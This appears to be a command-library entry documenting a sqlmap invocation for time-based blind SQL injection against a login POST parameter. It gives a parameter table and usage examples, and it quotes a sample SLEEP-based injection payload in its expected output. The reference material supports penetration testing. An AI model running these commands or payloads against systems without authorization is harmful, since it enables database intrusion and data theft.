---
id: cmd-uuid-2
data: sqlmap -r request.txt --dbms=mysql -p login --technique=T --delay=5
tags:
  - sqli
  - automation
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:46:26.137Z'
verified: false
validated: true
submitted: true
---
# sqlmap-time-based-payload

## Command

```bash
sqlmap -r request.txt --dbms=mysql -p login --technique=T --delay=5
```

## Description

This sqlmap command tests for time-based blind SQL injection in the specified POST parameter using SLEEP delays to confirm vulnerability without visible errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-r request.txt` | Load HTTP request from file | Yes |
| `--dbms=mysql` | Specify MySQL backend | Yes |
| `-p login` | Test 'login' parameter | Yes |
| `--technique=T` | Use time-based blind technique | Yes |
| `--delay=5` | Custom delay for SLEEP payload | No |

## Examples

### Basic Usage

```bash
sqlmap -u "https://example.com/login" --data="login=admin&pass=pass" -p login --technique=T
```

### Advanced Usage

```bash
sqlmap -r request.txt --dbms=mysql -p login --technique=T --risk=3 --level=5 --threads=1
```

## Expected Output

sqlmap logs showing payload injection like "login=admin' AND (SELECT 5206 FROM (SELECT(SLEEP(5)))THtF) AND 'MHhg'='MHhg", followed by "parameter 'login' is vulnerable. Do you want to keep testing? [y/N]" and delay confirmation.

## Related

- [[Related Procedure|procedures/Automated-SQL-Injection-Confirmation-with-sqlmap]]
